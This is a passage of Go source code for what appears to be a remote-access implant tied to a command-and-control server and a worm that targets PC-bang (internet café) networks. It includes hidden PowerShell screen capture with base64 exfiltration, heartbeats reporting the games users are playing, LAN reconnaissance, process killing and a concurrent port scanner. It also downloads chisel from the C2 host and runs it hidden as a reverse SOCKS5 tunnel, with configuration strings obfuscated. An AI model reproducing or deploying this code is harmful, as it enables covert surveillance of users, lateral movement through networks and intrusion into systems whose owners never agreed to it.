	return snap
}

func captureScreenshotWin() (string, error) {
	tmpDir := os.TempDir()
	outPath := filepath.Join(tmpDir, fmt.Sprintf("c2_ss_%d.png", time.Now().UnixNano()))

	psCmd := fmt.Sprintf(
		`Add-Type -AssemblyName System.Windows.Forms,System.Drawing;
		 $s = [Windows.Forms.Screen]::PrimaryScreen.Bounds;
		 $b = New-Object Drawing.Bitmap $s.Width, $s.Height;
		 $g = [Drawing.Graphics]::FromImage($b);
		 $g.CopyFromScreen($s.Left, $s.Top, 0, 0, $b.Size);
		 $b.Save('%s', [Drawing.Imaging.ImageFormat]::Png);
		 $g.Dispose(); $b.Dispose();
		 Write-Host 'OK'`,
		strings.ReplaceAll(outPath, "'", "''"),
	)
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()
	cmd := hiddenCmdCtx(ctx, "powershell", "-NoProfile", "-Command", psCmd)
	var buf bytes.Buffer
	cmd.Stdout = &buf
	cmd.Stderr = &buf
	if err := cmd.Run(); err != nil {
		return "", fmt.Errorf("powershell capture: %v (out=%s)", err, strings.TrimSpace(buf.String()))
	}
	raw, err := os.ReadFile(outPath)
	if err != nil {
		return "", fmt.Errorf("read screenshot: %v", err)
	}
	os.Remove(outPath)

	sum := sha256.Sum256(raw)
	meta, _ := json.Marshal(map[string]interface{}{
		"type":     "screenshot",
		"size":     len(raw),
		"sha256":   hex.EncodeToString(sum[:]),
		"data_b64": base64.StdEncoding.EncodeToString(raw),
	})
	return string(meta), nil
}

func buildHeartbeat() map[string]interface{} {
	snap := scanGames()
	m := map[string]interface{}{
		"type":          "heartbeat",
		"agent_id":      agentID,
		"timestamp":     time.Now().Unix(),
		"game_active":   snap.Active,
		"stream_enable": snap.StreamEnable,
		"dashboard_led": snap.LED,
	}
	if snap.Active {
		m["game_id"] = snap.ID
		m["game_title"] = snap.Title
		m["game_pid"] = snap.PID
		m["game_since"] = snap.Since
	}
	if snap.Profile != "" {
		m["game_profile"] = snap.Profile
	}
	// Append management server detection info if worm found one
	if mgmtInfo := getMgmtServerInfo(); mgmtInfo != nil {
		m["pcbang"] = true
		for k, v := range mgmtInfo {
			m["mgmt_"+k] = v
		}
	}
	return m
}

/* ---------- LAN recon helpers ---------- */

func runLANRecon() (map[string]interface{}, error) {
	result := map[string]interface{}{
		"hostname":        "",
		"interfaces":      []map[string]interface{}{},
		"arp_table":       []map[string]string{},
		"listening_ports": []map[string]interface{}{},
		"dns_servers":     []string{},
		"default_gateway": "",
		"routing_table":   []string{},
	}
	hn, _ := os.Hostname()
	result["hostname"] = hn

	// Interfaces (Go net package)
	ifaces, _ := net.Interfaces()
	var ifaceList []map[string]interface{}
	for _, iface := range ifaces {
		if iface.Flags&net.FlagLoopback != 0 {
			continue
		}
		addrs, _ := iface.Addrs()
		var ips []string
		for _, addr := range addrs {
			ips = append(ips, addr.String())
		}
		if len(ips) == 0 {
			continue
		}
		ifaceList = append(ifaceList, map[string]interface{}{
			"name": iface.Name,
			"mac":  iface.HardwareAddr.String(),
			"ips":  ips,
		})
	}
	result["interfaces"] = ifaceList

	if runtime.GOOS == "windows" {
		getARPTableWin(result)
		getListeningPortsWin(result)
		getDNSServersWin(result)
		getDefaultGatewayWin(result)
	}
	return result, nil
}

func runCmd(args ...string) (string, error) {
	cmd := hiddenCmd(args[0], args[1:]...)
	out, err := cmd.Output()
	if err != nil {
		return "", err
	}
	return string(out), nil
}

func getARPTableWin(r map[string]interface{}) {
	out, err := runCmd("arp", "-a")
	if err != nil {
		return
	}
	var table []map[string]string
	for _, line := range strings.Split(out, "\n") {
		line = strings.TrimSpace(line)
		if line == "" || strings.Contains(line, "Interface") || strings.Contains(line, "Internet") || strings.Contains(line, "---") {
			continue
		}
		parts := strings.Fields(line)
		if len(parts) >= 3 {
			ip := parts[0]
			mac := parts[1]
			if strings.Count(ip, ".") == 3 && strings.Count(mac, "-") == 5 {
				table = append(table, map[string]string{"ip": ip, "mac": mac})
			}
		}
	}
	if len(table) > 0 {
		r["arp_table"] = table
	}
}

func getListeningPortsWin(r map[string]interface{}) {
	out, err := runCmd("netstat", "-ano")
	if err != nil {
		return
	}
	var ports []map[string]interface{}
	for _, line := range strings.Split(out, "\n") {
		line = strings.TrimSpace(line)
		if !strings.HasPrefix(line, "  TCP") && !strings.HasPrefix(line, "  UDP") {
			continue
		}
		parts := strings.Fields(line)
		if len(parts) < 5 {
			continue
		}
		proto := parts[0]
		localAddr := parts[1]
		state := ""
		pid := ""
		if proto == "TCP" && len(parts) >= 4 {
			state = parts[3]
			pid = parts[len(parts)-1]
		} else if proto == "UDP" {
			pid = parts[len(parts)-1]
		}
		// Extract port from localAddr (last part after colon)
		idx := strings.LastIndex(localAddr, ":")
		port := ""
		if idx >= 0 {
			port = localAddr[idx+1:]
		}
		if state == "LISTENING" || proto == "UDP" {
			ports = append(ports, map[string]interface{}{
				"proto": proto,
				"port":  port,
				"pid":   pid,
			})
		}
	}
	if len(ports) > 0 {
		r["listening_ports"] = ports
	}
}

func getDNSServersWin(r map[string]interface{}) {
	out, err := runCmd("ipconfig", "/all")
	if err != nil {
		return
	}
	var dns []string
	for _, line := range strings.Split(out, "\n") {
		line = strings.TrimSpace(line)
		if strings.Contains(line, "DNS Servers") || strings.Contains(line, "DNS-Server") {
			idx := strings.Index(line, ":")
			if idx >= 0 {
				val := strings.TrimSpace(line[idx+1:])
				if val != "" && !strings.Contains(val, ":") {
					dns = append(dns, val)
				}
			}
		} else if len(dns) > 0 && strings.HasPrefix(line, "   ") && strings.Contains(line, ".") {
			// Continuation lines with IP addresses
			val := strings.TrimSpace(line)
			if val != "" && strings.Count(val, ".") == 3 {
				dns = append(dns, val)
			}
		}
	}
	if len(dns) > 0 {
		r["dns_servers"] = dns
	}
}

func getDefaultGatewayWin(r map[string]interface{}) {
	out, err := runCmd("route", "print", "-4")
	if err != nil {
		return
	}
	for _, line := range strings.Split(out, "\n") {
		parts := strings.Fields(line)
		if len(parts) >= 5 && parts[0] == "0.0.0.0" && parts[1] == "0.0.0.0" {
			r["default_gateway"] = parts[2]
			break
		}
	}
	// Also collect routing table (all active routes)
	var routes []string
	inRoutes := false
	for _, line := range strings.Split(out, "\n") {
		line = strings.TrimSpace(line)
		if strings.Contains(line, "Active Routes:") {
			inRoutes = true
			continue
		}
		if strings.Contains(line, "Persistent Routes:") {
			break
		}
		if inRoutes {
			parts := strings.Fields(line)
			if len(parts) >= 5 && strings.Count(parts[0], ".") == 3 {
				routes = append(routes, fmt.Sprintf("%s/%s via %s", parts[0], parts[1], parts[2]))
			}
		}
	}
	if len(routes) > 0 {
		r["routing_table"] = routes
	}
}

/* ---------- list_dir / ps_list / ps_kill helpers ---------- */

type procInfo struct {
	PID  int     `json:"pid"`
	Name string  `json:"name"`
	CPU  float64 `json:"cpu,omitempty"`
	Mem  float64 `json:"mem,omitempty"`
}

func listProcesses() ([]procInfo, error) {
	if runtime.GOOS == "windows" {
		return listProcsWindows()
	}
	return listProcsLinux()
}

func listProcsWindows() ([]procInfo, error) {
	cmd := hiddenCmd("tasklist", "/FO", "CSV", "/NH")
	out, err := cmd.Output()
	if err != nil {
		return nil, fmt.Errorf("tasklist: %v", err)
	}
	reader := csv.NewReader(bytes.NewReader(out))
	records, err := reader.ReadAll()
	if err != nil {
		return nil, fmt.Errorf("csv parse: %v", err)
	}
	procs := make([]procInfo, 0, len(records))
	for _, r := range records {
		if len(r) < 2 {
			continue
		}
		name := strings.TrimSpace(r[0])
		if len(name) > 0 && name[0] == '"' && len(name) > 2 {
			name = name[1 : len(name)-1]
		}
		pid, _ := strconv.Atoi(strings.TrimSpace(r[1]))
		if pid > 0 {
			procs = append(procs, procInfo{PID: pid, Name: name})
		}
	}
	return procs, nil
}

func listProcsLinux() ([]procInfo, error) {
	entries, err := os.ReadDir("/proc")
	if err != nil {
		return nil, err
	}
	procs := make([]procInfo, 0, len(entries))
	for _, e := range entries {
		pid, err := strconv.Atoi(e.Name())
		if err != nil || pid == 0 {
			continue
		}
		nameB, err := os.ReadFile("/proc/" + e.Name() + "/comm")
		if err != nil {
			continue
		}
		name := strings.TrimSpace(string(nameB))
		if name != "" {
			procs = append(procs, procInfo{PID: pid, Name: name})
		}
	}
	return procs, nil
}

func killProcess(pid int) error {
	if runtime.GOOS == "windows" {
		cmd := hiddenCmd("taskkill", "/F", "/PID", strconv.Itoa(pid))
		out, _ := cmd.CombinedOutput()
		if cmd.ProcessState == nil || !cmd.ProcessState.Success() {
			return fmt.Errorf("taskkill: %s", strings.TrimSpace(string(out)))
		}
		return nil
	}
	p, err := os.FindProcess(pid)
	if err != nil {
		return err
	}
	return p.Kill()
}

/* ---------- net_scan helpers ---------- */

type scanResult struct {
	IP    string `json:"ip"`
	MAC   string `json:"mac,omitempty"`
	Alive bool   `json:"alive"`
	Ports []int  `json:"open_ports,omitempty"`
}

func netScan(subnet string, ports []int, timeoutMs int) (string, error) {
	if subnet == "" {
		var err error
		subnet, err = detectSubnet()
		if err != nil {
			return "", fmt.Errorf("auto-detect subnet: %v", err)
		}
	}
	if timeoutMs <= 0 {
		timeoutMs = 2000
	}

	// Step 1: discover live hosts via ARP
	var results []scanResult
	if runtime.GOOS == "windows" {
		results = arpScanWindows()
	} else {
		results = arpScanLinux()
	}

	// Step 2: if ports specified, sweep common ones on each live host (concurrent)
	if len(ports) > 0 {
		timeout := time.Duration(timeoutMs) * time.Millisecond
		sem := make(chan struct{}, 50) // limit concurrency
		var mu sync.Mutex
		var wg sync.WaitGroup

		for i := range results {
			if !results[i].Alive {
				continue
			}
			results[i].Ports = make([]int, 0)
			for _, p := range ports {
				wg.Add(1)
				port := p // capture
				go func(idx int, hostIP string) {
					defer wg.Done()
					sem <- struct{}{}
					defer func() { <-sem }()

					addr := net.JoinHostPort(hostIP, strconv.Itoa(port))
					conn, err := net.DialTimeout("tcp", addr, timeout)
					if err == nil {
						conn.Close()
						mu.Lock()
						results[idx].Ports = append(results[idx].Ports, port)
						mu.Unlock()
					}
				}(i, results[i].IP)
			}
		}
		wg.Wait()
	}

	b, _ := json.Marshal(results)
	return string(b), nil
}

func detectSubnet() (string, error) {
	if runtime.GOOS == "windows" {
		cmd := hiddenCmd("powershell", "-NoProfile", "-Command",
			"(Get-NetRoute -DestinationPrefix '0.0.0.0/0').NextHop")
		out, err := cmd.Output()
		if err == nil {
			gw := strings.TrimSpace(string(out))
			if gw != "" {
				return gw + "/24", nil
			}
		}
		// fallback: ipconfig
		cmd2 := hiddenCmd("ipconfig")
		out2, _ := cmd2.Output()
		lines := strings.Split(string(out2), "\n")
		for _, line := range lines {
			if strings.Contains(line, "Default Gateway") && strings.Contains(line, ".") {
				parts := strings.Split(line, ": ")
				if len(parts) == 2 {
					gw := strings.TrimSpace(parts[1])
					if gw != "" && gw != ":" {
						ip := net.ParseIP(gw)
						if ip != nil && !ip.IsLoopback() {
							return gw + "/24", nil
						}
					}
				}
			}
		}
		return "", fmt.Errorf("could not detect subnet")
	}
	// Linux: read /proc/net/route for default gateway
	data, err := os.ReadFile("/proc/net/route")
	if err != nil {
		return "", err
	}
	for _, line := range strings.Split(string(data), "\n")[1:] {
		fields := strings.Fields(line)
		if len(fields) >= 3 && fields[1] == "00000000" {
			// gateway is in hex (little-endian)
			gwHex := fields[2]
			if len(gwHex) == 8 {
				ip := fmt.Sprintf("%d.%d.%d.%d",
					hexToInt(gwHex[6:8]), hexToInt(gwHex[4:6]),
					hexToInt(gwHex[2:4]), hexToInt(gwHex[0:2]))
				return ip + "/24", nil
			}
		}
	}
	return "", fmt.Errorf("could not detect subnet")
}

func hexToInt(s string) int {
	v, _ := strconv.ParseInt(s, 16, 32)
	return int(v)
}

func arpScanWindows() []scanResult {
	cmd := hiddenCmd("arp", "-a")
	out, err := cmd.Output()
	if err != nil {
		return nil
	}
	var results []scanResult
	seen := map[string]bool{}
	for _, line := range strings.Split(string(out), "\n") {
		fields := strings.Fields(line)
		if len(fields) >= 3 {
			ip := fields[0]
			mac := fields[1]
			if strings.Count(ip, ".") == 3 && strings.Count(mac, "-") == 5 {
				if !seen[ip] {
					seen[ip] = true
					results = append(results, scanResult{
						IP:    ip,
						MAC:   mac,
						Alive: mac != "ff-ff-ff-ff-ff-ff",
					})
				}
			}
		}
	}
	return results
}

func arpScanLinux() []scanResult {
	data, err := os.ReadFile("/proc/net/arp")
	if err != nil {
		return nil
	}
	var results []scanResult
	seen := map[string]bool{}
	for _, line := range strings.Split(string(data), "\n")[1:] {
		fields := strings.Fields(line)
		if len(fields) >= 4 {
			ip := fields[0]
			mac := fields[3]
			hw := fields[2]
			if strings.Count(ip, ".") == 3 && hw == "0x1" {
				if !seen[ip] {
					seen[ip] = true
					alive := mac != "00:00:00:00:00:00" && mac != ""
					results = append(results, scanResult{
						IP:    ip,
						MAC:   mac,
						Alive: alive,
					})
				}
			}
		}
	}
	return results
}

// ---------- SOCKS5 Proxy (Chisel) ----------

var (
	socksMu  sync.Mutex
	socksCmd *exec.Cmd
)

// socksProxyDefaultServer returns the C2 server host to connect chisel to.
func socksProxyDefaultServer() string {
	if config.C2Server != "" {
		u, err := url.Parse(config.C2Server)
		if err == nil {
			host := u.Hostname()
			return host + xob(ePort8444)
		}
	}
	return xob(eLoopback8444)
}

// socksProxyStart downloads chisel and starts it as a reverse SOCKS5 client.
func socksProxyStart(server, proxyPort string) (int, error) {
	socksMu.Lock()
	defer socksMu.Unlock()

	socksProxyStopLocked()

	chiselURL := socksChiselDownloadURL()
	tmpDir := os.TempDir()
	chiselPath := filepath.Join(tmpDir, "chisel_socks.exe")

	var lastErr error
	for i := 0; i < 3; i++ {
		lastErr = downloadFile(chiselPath, chiselURL)
		if lastErr == nil {
			break
		}
		time.Sleep(time.Second)
	}
	if lastErr != nil {
		return 0, fmt.Errorf("download failed: %v", lastErr)
	}

	args := []string{"client", server, "R:" + proxyPort + ":socks"}
	cmd := hiddenCmd(chiselPath, args...)
	if err := cmd.Start(); err != nil {
		return 0, fmt.Errorf("start failed: %v", err)
	}
	socksCmd = cmd
	return cmd.Process.Pid, nil
}

func socksProxyStop() {
	socksMu.Lock()
	defer socksMu.Unlock()
	socksProxyStopLocked()
}

func socksProxyStopLocked() {
	if socksCmd != nil && socksCmd.Process != nil {
		socksCmd.Process.Kill()
		socksCmd.Wait()
		socksCmd = nil
	}
}

func socksChiselDownloadURL() string {
	base := config.C2Server
	if base == "" {
		base = strings.TrimSpace(xob(eWssURL))
	}
	if base == "" {
		base = strings.TrimSpace(xob(eLabWss))
	}
	u, err := url.Parse(base)
	if err != nil {
		return strings.TrimSpace(xob(eLabChiselExe))
	}
	u.Scheme = "https"
	u.Path = xob(eChiselPath)
	u.RawQuery = ""
	return u.String()
}

func downloadFile(path, url string) error {
	client := &http.Client{
		Timeout: 30 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: config.InsecureTLS},
		},
	}
	resp, err := client.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("HTTP %d", resp.StatusCode)
	}
	out, err := os.Create(path)
	if err != nil {
		return err
	}
	defer out.Close()
	_, err = io.Copy(out, resp.Body)
	return err
}
